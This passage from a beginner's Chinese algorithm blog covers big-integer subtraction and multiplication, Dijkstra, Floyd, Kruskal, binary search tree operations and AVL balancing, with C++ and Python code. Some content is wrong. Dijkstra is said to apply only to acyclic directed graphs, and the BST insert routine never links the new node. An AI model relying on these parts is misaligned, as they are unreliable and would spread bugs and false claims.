<span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里有一道例题，洛谷的p1601,可以用这个解法。</p>
<h4 id="a-b高精度，a-b高精度"><a href="#a-b高精度，a-b高精度" class="headerlink" title="a-b高精度，a*b高精度"></a>a-b高精度，a*b高精度</h4><p>这两种方法基本一样，要注意的是减法有一些特殊情况，比如负数，输出长度的判断等等，这里我就摆一种简单的，乘法也是需要注意长度区别。</p>
<p>实现代码：</p>
<p>减法：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line">string a,b;</span><br><span class="line"><span class="type">bool</span> jg;</span><br><span class="line"><span class="type">int</span> arr_a[<span class="number">100005</span>],arr_b[<span class="number">10005</span>],ans[<span class="number">100005</span>],temp;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">re_input</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i =<span class="number">1</span>;i&lt;=a.<span class="built_in">size</span>();i++)</span><br><span class="line">	&#123;</span><br><span class="line">		arr_a[i]=a[a.<span class="built_in">size</span>()-i]-<span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> j =<span class="number">1</span>;j&lt;=b.<span class="built_in">size</span>();j++)</span><br><span class="line">	&#123;</span><br><span class="line">		arr_b[j]=b[b.<span class="built_in">size</span>()-j]-<span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">to_divide</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i =<span class="number">1</span>;i&lt;=temp;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span>(arr_a[i]&lt;arr_b[i])</span><br><span class="line">		&#123;</span><br><span class="line">			arr_a[i+<span class="number">1</span>]--;</span><br><span class="line">			arr_a[i]+=<span class="number">10</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		ans[i]=arr_a[i]-arr_b[i];</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">while</span>(ans[temp]==<span class="number">0</span>) temp--;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">to_printf</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(jg==<span class="literal">true</span>) cout&lt;&lt;<span class="string">&quot;-&quot;</span>;</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i =temp;i&gt;<span class="number">0</span>;i--)</span><br><span class="line">	&#123;</span><br><span class="line">		cout&lt;&lt;ans[i];</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(temp&lt;<span class="number">1</span>) cout&lt;&lt;<span class="string">&quot;0&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	ios::<span class="built_in">sync_with_stdio</span>(<span class="literal">false</span>);</span><br><span class="line">	cin.<span class="built_in">tie</span>(<span class="number">0</span>);</span><br><span class="line">	cout.<span class="built_in">tie</span>(<span class="number">0</span>);</span><br><span class="line">	</span><br><span class="line">	cin&gt;&gt;a&gt;&gt;b;</span><br><span class="line">	<span class="keyword">if</span>(a&lt;b&amp;&amp;a.<span class="built_in">size</span>()==b.<span class="built_in">size</span>()||a.<span class="built_in">size</span>()&lt;b.<span class="built_in">size</span>())</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">swap</span>(a,b);</span><br><span class="line">		jg=<span class="literal">true</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	temp=<span class="built_in">max</span>(a.<span class="built_in">size</span>(),b.<span class="built_in">size</span>());</span><br><span class="line">	<span class="built_in">re_input</span>();</span><br><span class="line">	<span class="built_in">to_divide</span>();</span><br><span class="line">	<span class="built_in">to_printf</span>();</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>乘法：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line">string a,b;</span><br><span class="line"><span class="type">int</span> arr01[<span class="number">100005</span>],arr02[<span class="number">100005</span>],sum[<span class="number">100005</span>],temp=<span class="number">0</span>;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">re_change</span><span class="params">()</span><span class="comment">//倒序存储部分 </span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i =<span class="number">0</span>;i&lt;a.<span class="built_in">size</span>();i++)</span><br><span class="line">	&#123;</span><br><span class="line">		arr01[i]=a[a.<span class="built_in">size</span>()-i<span class="number">-1</span>]<span class="number">-48</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;b.<span class="built_in">size</span>();i++)</span><br><span class="line">	&#123;</span><br><span class="line">		arr02[i]=b[b.<span class="built_in">size</span>()-i<span class="number">-1</span>]<span class="number">-48</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">mutiply</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i =<span class="number">0</span>;i&lt;b.<span class="built_in">size</span>();i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">for</span>(<span class="type">int</span> j =<span class="number">0</span>;j&lt;a.<span class="built_in">size</span>();j++)</span><br><span class="line">		&#123;</span><br><span class="line">			sum[i+j]+=arr01[j]*arr02[i];<span class="comment">//注意下标从1开始，进位减去1 </span></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span>(temp =<span class="number">0</span>;temp&lt;=a.<span class="built_in">size</span>()+b.<span class="built_in">size</span>();temp++)<span class="comment">//处理进位 </span></span><br><span class="line">	&#123;</span><br><span class="line">		</span><br><span class="line">		sum[temp]+=sum[temp<span class="number">-1</span>]/<span class="number">10</span>;</span><br><span class="line">		sum[temp<span class="number">-1</span>]%=<span class="number">10</span>;</span><br><span class="line">		</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//temp=a.size()+b.size();</span></span><br><span class="line">	<span class="keyword">while</span>(sum[temp]==<span class="number">0</span>&amp;&amp;temp&gt;=<span class="number">1</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		temp--;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line"> &#125; </span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	ios::<span class="built_in">sync_with_stdio</span>(<span class="literal">false</span>);</span><br><span class="line">	cin.<span class="built_in">tie</span>(<span class="number">0</span>);</span><br><span class="line">	cout.<span class="built_in">tie</span>(<span class="number">0</span>);</span><br><span class="line">	</span><br><span class="line">	cin&gt;&gt;a&gt;&gt;b;</span><br><span class="line">	<span class="built_in">re_change</span>();</span><br><span class="line">	<span class="built_in">mutiply</span>();</span><br><span class="line">	<span class="keyword">for</span>(;temp&gt;=<span class="number">0</span>;temp--)</span><br><span class="line">	&#123;</span><br><span class="line">		cout&lt;&lt;sum[temp];</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>以上内容皆为初学者的浅薄理解，如有错误麻烦立即告诉作者，别喷别喷别喷呜呜呜~</p>
]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>基础</tag>
        <tag>算法</tag>
        <tag>C++</tag>
      </tags>
  </entry>
  <entry>
    <title>基础算法03</title>
    <url>/2022/11/27/%E5%9F%BA%E7%A1%80%E7%AE%97%E6%B3%9503/</url>
    <content><![CDATA[<p> 不过是笔记本罢了(悲~</p>
<h2 id="Dijkstra-算法（狄克斯特拉算法）"><a href="#Dijkstra-算法（狄克斯特拉算法）" class="headerlink" title="Dijkstra 算法（狄克斯特拉算法）"></a>Dijkstra 算法（狄克斯特拉算法）</h2><p>这是一种求解无负权边图的最短路径的算法，他的大概过程是先将<strong>已确定最短路径</strong>的点和<strong>未确定最短路径</strong>的点分别分为两个集合，一开始所有点都处于后者集合，随后依次从后者集合取出最短路长度最小的点，移到前者集合中。这里要注意这个算法只适用于有向无环图。</p>
<p>该算法是求源点到其他各个顶点的最短路径，如果求解任意两个顶点的最短路径，则需要以每个顶点为源点，重复调用n次Dijkstra算法。</p>
<h3 id="算法步骤："><a href="#算法步骤：" class="headerlink" title="算法步骤："></a>算法步骤：</h3><ol>
<li>初始化，令集合S={u}，对于集合V-S中的所有顶点i，$dist[i]=G.Edge[u][i]$。</li>
<li>找最小，在集合V-S中依照贪心策略寻找使得dist[j]具有最小值的顶点t，即$dist[t]=min(dist[j])$，即顶点t就是集合V-S中距离原点u最近的顶点。</li>
<li>将顶点t加入集合S中，更新V-S</li>
<li>如果结合V-S为空则算法结束，否则跳转第五步</li>
<li>在第2步中已经找到了源点到t的最短路径，那么对集合V−S中所有与顶点t相邻的顶点j，都可以借助t走捷径。如果$dist[j]&gt;dist[t]+G.Edge[t][j]$，则$dist[j]=dist[t]+G.Edge[t][j]$，记录顶点j的前驱为t，有p[j]=t，转到第2步。</li>
</ol>
<h3 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h3><p>首先该算法需要一个图结构，包含顶点集合，边集合，顶点数，边数，</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span>&#123;</span><br><span class="line">	VexType Vex[MaxVnum];</span><br><span class="line">	EdgeType Edge[MaxVnum][MaxVnum];</span><br><span class="line">	<span class="type">int</span> vexnum,edgenum; <span class="comment">//顶点数，边数</span></span><br><span class="line">&#125;AMGragh;</span><br></pre></td></tr></table></figure>
<p>需要一个查找下标的函数</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">locatevex</span><span class="params">(AMGragh G,VexType x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;G.vexnum;i++)<span class="comment">//查找顶点信息的下标</span></span><br><span class="line">		<span class="keyword">if</span>(x==G.Vex[i])</span><br><span class="line">			<span class="keyword">return</span> i;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;<span class="comment">//没找到</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="Floyd算法（佛洛依德算法）"><a href="#Floyd算法（佛洛依德算法）" class="headerlink" title="Floyd算法（佛洛依德算法）"></a>Floyd算法（佛洛依德算法）</h2><p>这是一个利用点来求得两点间路径最短的算法，它可以求出任意两点的最短距离。主要思路如下：将图中边的信息用邻接矩阵表达出来之后，依次比较两点的关系，查看是否有中间点的存在能使两点的距离变得更小，如果存在该中间点，则更新路径，注意一开始不能直接到达的点间距离设为无穷。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Graph</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, n=<span class="number">0</span>, e=<span class="number">0</span></span>):</span><br><span class="line">        self.<span class="built_in">list</span> = [<span class="string">&quot;a&quot;</span>*e]  <span class="comment">#点的集合</span></span><br><span class="line">        self.edge=[[INF]*e]</span><br><span class="line">        self.n = n<span class="comment">#边数量</span></span><br><span class="line">        self.e = e<span class="comment">#点数量</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">CreateAdjGraph</span>(<span class="params">self,n,e,a,b</span>):<span class="comment">#a表示节点名称，b表示邻接矩阵</span></span><br><span class="line">        self.n = n</span><br><span class="line">        self.e = e</span><br><span class="line">        self.<span class="built_in">list</span>=a</span><br><span class="line">        self.edge=b</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">locateVex</span>(<span class="params">self,value</span>):<span class="comment"># 这一步是找到名称为value的点的下标</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(self.e):<span class="comment"># 遍历点集合</span></span><br><span class="line">            <span class="keyword">if</span> value==self.<span class="built_in">list</span>[i]:</span><br><span class="line">                <span class="keyword">return</span> i</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span>  <span class="comment">#没找到</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">Floyd</span>(<span class="params">self</span>):<span class="comment"># 寻找最小路径算法，anser是答案矩阵，表示任意两点的最小值。</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(self.e):</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(self.e):</span><br><span class="line">                anser[i][j]=self.edge[i][j]<span class="comment"># 初始状态边的权就是答案矩阵</span></span><br><span class="line">                <span class="keyword">if</span> anser[i][j]&lt;INF <span class="keyword">and</span> i!=j:</span><br><span class="line">                    pare[i][j]=i <span class="comment"># pare是前驱矩阵，表示从i到j的最短路径中j的前一个点。</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    pare[i][j]=-<span class="number">1</span><span class="comment"># 从i到j不存在路径</span></span><br><span class="line"><span class="comment"># 三层循环2333</span></span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(self.e):</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(self.e):</span><br><span class="line">                <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(self.e):</span><br><span class="line">                    <span class="keyword">if</span> anser[i][k]+anser[k][j]&lt;anser[i][j]:<span class="comment"># i到k到j比i到j距离短</span></span><br><span class="line">                        anser[i][j]=anser[i][k]+anser[k][j]<span class="comment"># 更新图信息</span></span><br><span class="line">                        pare[i][j]=pare[k][j]<span class="comment"># 将k点加入i到j路径中</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">output</span>(<span class="params">self</span>):<span class="comment"># 分别输出两个矩阵，视情况而定</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(self.e):</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(self.e):</span><br><span class="line">                <span class="built_in">print</span>(anser[i][j],end=<span class="string">&quot; &quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(self.e):</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(self.e):</span><br><span class="line">                <span class="built_in">print</span>(pare[i][j],end=<span class="string">&quot; &quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">FindTheLeast</span>(<span class="params">self,s,e</span>):<span class="comment">#s代表起点，e代表终点</span></span><br><span class="line">        <span class="keyword">global</span> route</span><br><span class="line">        <span class="keyword">if</span> pare[s][e]!=-<span class="number">1</span>:<span class="comment"># s到e连通</span></span><br><span class="line">            self.FindTheLeast(s,pare[s][e])<span class="comment"># 一直找到s到e中s的下一个点</span></span><br><span class="line">            route+=<span class="built_in">str</span>(self.<span class="built_in">list</span>[pare[s][e]])+<span class="string">&quot;------&gt;&quot;</span><span class="comment"># 加入答案</span></span><br><span class="line">            <span class="comment"># print(self.list[pare[s][e]],end=&quot;-----&gt;&quot;)</span></span><br><span class="line">        <span class="comment"># print(self.list[e])</span></span><br></pre></td></tr></table></figure>
<h2 id="Kruskal算法实现最小生成树"><a href="#Kruskal算法实现最小生成树" class="headerlink" title="Kruskal算法实现最小生成树"></a>Kruskal算法实现最小生成树</h2><p>首先我们先知道一个最小生成树的性质：树中一定不会出现环，其边数等于顶点数减一</p>
<p>这个算法采用边贪心策略，基本思路是隐去图中的所有边，这样所有的点都成为了一个个独立的块。然后对所有的边按照权来排序，排序结束后按照边权从小到大一条一条加入当前的最小生成树当中，如果成环则舍弃这个边，随后重复这个过程，知道边数等于总顶点数减一或者测试完所有边时结束。值得一提的是，如果结束之后最小生成树的边数小于总顶点数减1，说明该图不连通。</p>
<h2 id="二叉搜索（查找）树"><a href="#二叉搜索（查找）树" class="headerlink" title="二叉搜索（查找）树"></a>二叉搜索（查找）树</h2><p>二叉搜索树的中序遍历具备有序性，因此二分查找树的查找效率较高。</p>
<p>基本步骤：</p>
<ul>
<li>若整个树为空，查找失败，返回空指针</li>
<li>若非空，将待查找值x和关键字T-&gt;data比较，若小于，查找左子树，大于，查找右子树</li>
</ul>
<p>前面的代码较简单，查找采用的是递归查找:</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">Node</span></span><br><span class="line">&#123;</span><br><span class="line">	ElemType data;</span><br><span class="line">	Node *lchild,*rchild;</span><br><span class="line">&#125;Node,*BSTree;</span><br><span class="line"></span><br><span class="line"><span class="function">BSTree <span class="title">Search</span><span class="params">(BSTree T,ElemType value)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span>((!T)||value==T-&gt;data)</span><br><span class="line">		<span class="keyword">return</span> T;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span>(value&lt;T-&gt;data)</span><br><span class="line">		<span class="keyword">return</span> <span class="built_in">Search</span>(T-&gt;lchild,value);</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		<span class="keyword">return</span> <span class="built_in">Search</span>(T-&gt;rchild,value);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">InsertTree</span><span class="params">(BSTree &amp;T,ElemType e)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(!T)</span><br><span class="line">	&#123;</span><br><span class="line">		BSTree S=<span class="keyword">new</span> Node;</span><br><span class="line">		S-&gt;data=e;</span><br><span class="line">		S-&gt;lchild=<span class="literal">NULL</span>;</span><br><span class="line">		S-&gt;rchild=<span class="literal">NULL</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span>(e&gt;T-&gt;data) <span class="built_in">InsertTree</span>(T-&gt;rchild,e);</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span>(e&lt;T-&gt;data) <span class="built_in">InsertTree</span>(T-&gt;lchild,e);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">CreateBST</span><span class="params">(BSTree &amp;T)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	T=<span class="literal">NULL</span>;</span><br><span class="line">	ElemType e;</span><br><span class="line">	cin&gt;&gt;e;</span><br><span class="line">	<span class="keyword">while</span>(e!=ENDFLAG)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">InsertTree</span>(T,e);</span><br><span class="line">		cin&gt;&gt;e;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="删除"><a href="#删除" class="headerlink" title="删除"></a>删除</h3><p>删除就要分情况讨论，</p>
<ol>
<li>当待删除节点左子树为空时，其右子树子承父业代替其位置</li>
<li>当待删除节点右子树为空时，其左子树子承父业代替其位置</li>
<li>当待删除节点没有子节点，直接删除</li>
<li>当待删除结点有两个非空子节点，一般是用<strong>左子树最大值和右子树最小值</strong>代替它，然后删除</li>
</ol>
<p>代码如下：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">DeleteBST</span><span class="params">(BSTree &amp;T,<span class="type">char</span> key)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="comment">//从二叉排序树T中删除关键字等于key的结点</span></span><br><span class="line">    BSTree p=T;BSTree f=<span class="literal">NULL</span>;</span><br><span class="line">    BSTree q;</span><br><span class="line">    BSTree s;</span><br><span class="line">    <span class="keyword">if</span>(!T) <span class="keyword">return</span>; <span class="comment">//树为空则返回</span></span><br><span class="line">    <span class="keyword">while</span>(p)<span class="comment">//查找</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(p-&gt;data==key) <span class="keyword">break</span>;  <span class="comment">//找到关键字等于key的结点p，结束循环</span></span><br><span class="line">        f=p;                <span class="comment">//f为p的双亲</span></span><br><span class="line">        <span class="keyword">if</span> (p-&gt;data&gt;key)</span><br><span class="line">            p=p-&gt;lchild; <span class="comment">//在p的左子树中继续查找</span></span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            p=p-&gt;rchild; <span class="comment">//在p的右子树中继续查找</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!p) <span class="keyword">return</span>; <span class="comment">//找不到被删结点则返回</span></span><br><span class="line">    <span class="comment">//三种情况：p左右子树均不空、无右子树、无左子树</span></span><br><span class="line">    <span class="keyword">if</span>((p-&gt;lchild)&amp;&amp;(p-&gt;rchild))<span class="comment">//被删结点p左右子树均不空</span></span><br><span class="line">    &#123;</span><br><span class="line">        q=p;</span><br><span class="line">        s=p-&gt;lchild;</span><br><span class="line">        <span class="keyword">while</span>(s-&gt;rchild)<span class="comment">//在p的左子树中继续查找其前驱结点，即最右下结点</span></span><br><span class="line">        &#123;</span><br><span class="line">            q=s;</span><br><span class="line">            s=s-&gt;rchild;</span><br><span class="line">        &#125;</span><br><span class="line">        p-&gt;data=s-&gt;data;  <span class="comment">//s的值赋值给被删结点p,然后删除s结点</span></span><br><span class="line">        <span class="keyword">if</span>(q!=p)</span><br><span class="line">            q-&gt;rchild=s-&gt;lchild; <span class="comment">//重接q的右子树</span></span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            q-&gt;lchild=s-&gt;lchild; <span class="comment">//重接q的左子树</span></span><br><span class="line">        <span class="keyword">delete</span> s;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(!p-&gt;rchild)<span class="comment">//被删结点p无右子树，只需重接其左子树</span></span><br><span class="line">        &#123;</span><br><span class="line">            q=p;</span><br><span class="line">            p=p-&gt;lchild;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(!p-&gt;lchild)<span class="comment">//被删结点p无左子树，只需重接其右子树</span></span><br><span class="line">        &#123;</span><br><span class="line">             q=p;</span><br><span class="line">             p=p-&gt;rchild;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">/*――――――――――将p所指的子树挂接到其双亲结点f相应的位置――――――――*/</span></span><br><span class="line">        <span class="keyword">if</span>(!f)</span><br><span class="line">            T=p;  <span class="comment">//被删结点为根结点</span></span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(q==f-&gt;lchild)</span><br><span class="line">                f-&gt;lchild=p; <span class="comment">//挂接到f的左子树位置</span></span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                f-&gt;rchild=p;<span class="comment">//挂接到f的右子树位置</span></span><br><span class="line">        <span class="keyword">delete</span> q;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>删除的代码有点难以理解，最好是根据图像来理解，首先我们要清楚这里的f节点，p节点，q节点和s节点到底是什么，f节点是待删除节点的父亲节点，p节点是待删除节点，q节点是p节点的左子树的最右节点(有点逆天)，s节点是q节点的最右的值，图像如下：</p>
<p><img src="https://s3.bmp.ovh/imgs/2022/11/27/363ec8d6850ffe48.png" alt=""></p>
<p>通过这个图我们就可以看到删除的过程了，首先是找到s节点，它将是代替被删除节点的节点，当p节点被修改值之后就可以删除s节点了，当构建完q节点的右子树之后，p节点被删除，s节点取代p节点的位置，最后再修改f节点的指向即可。</p>
<p>当然存在一种特殊情况：p的左子树里面没有右子树，这样的话p和q节点将代表了同一个节点，这时只需要将s替代掉p节点然后重接p节点的左子树即可。</p>
<p><img src="https://s3.bmp.ovh/imgs/2022/11/27/740b7c1d4bcf290d.png" alt=""></p>
<h2 id="平衡二叉树（AVL树）"><a href="#平衡二叉树（AVL树）" class="headerlink" title="平衡二叉树（AVL树）"></a>平衡二叉树（AVL树）</h2><h3 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h3><p>二叉搜索树的查找，插入，删除的时间复杂度均线性正比于二叉搜索树的高度，因此高度越小，效率越高。首先得明白平衡二叉树的定义，或者说平衡二叉树的一些性质：</p>
<ul>
<li>左右子树的高度差的绝对值不超过1</li>
<li>左右子树也是平衡二叉树</li>
</ul>
<p>另外节点左右子树的高度差称为平衡因子。</p>
<p>知道平衡二叉树的定义之后我们开始插入平衡二叉树，我们在这个二叉树当中插入20。</p>
<p><img src="https://s3.bmp.ovh/imgs/2022/11/28/bac764c969739f01.png" alt=""></p>
<p>插入后的二叉树如下，这时我们从新插入节点向上，找到最近的不平衡节点，即左右子树高度差值大于1，以该节点为根节点的树称为最小不平衡树，也就是说我们要将该不平衡树调整为平衡二叉树即可。</p>
<p><img src="https://s3.bmp.ovh/imgs/2022/11/28/8c261c6f6751cf21.png" alt=""></p>
<p>基本结构代码：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">AVLNode</span>&#123;</span><br><span class="line">   <span class="type">int</span> data;</span><br><span class="line">   <span class="type">int</span> height;</span><br><span class="line">   <span class="keyword">struct</span> <span class="title class_">AVLNode</span> *lchild;</span><br><span class="line">   <span class="keyword">struct</span> <span class="title class_">AVLNode</span> *rchild;</span><br><span class="line">&#125;*AVLTree;</span><br><span class="line"></span><br><span class="line"><span class="function">AVLTree <span class="title">Empty</span><span class="params">(AVLTree &amp;T)</span><span class="comment">//删除树</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(T==<span class="literal">NULL</span>) <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    <span class="built_in">Empty</span>(T-&gt;lchild);</span><br><span class="line">    <span class="built_in">Empty</span>(T-&gt;rchild);</span><br><span class="line">    <span class="keyword">delete</span> T;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="type">int</span> <span class="title">Height</span><span class="params">(AVLTree T)</span><span class="comment">//计算高度</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(T==<span class="literal">NULL</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> T-&gt;height;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">updateHeight</span><span class="params">(AVLTree &amp;T)</span><span class="comment">//更新高度</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">     T-&gt;height=<span class="built_in">max</span>(<span class="built_in">Height</span>(T-&gt;lchild),<span class="built_in">Height</span>(T-&gt;rchild))+<span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="调整方法"><a href="#调整方法" class="headerlink" title="调整方法"></a>调整方法</h3><p>知道要做什么之后，就要了解如何平衡这个树。调整平衡可以分为4种情况：LL, RR, LR, RL。</p>
<h4 id="LL旋转"><a href="#LL旋转" class="headerlink" title="LL旋转"></a>LL旋转</h4><p>LL型的意思就是最近不平衡节点A和插入节点C之间的路径是两个左子树，即A的左子树的左子树为C。方法是将A顺时针旋转代替B的右子树位置，这时$T_3$空闲出来，A节点没有左子树，将被抛弃的子树$T_3$拼接到A的左子树即可。</p>
<p><img src="https://s3.bmp.ovh/imgs/2022/11/28/cc1bf19f534ecfc5.png" alt=""></p>
<p>代码：</p>
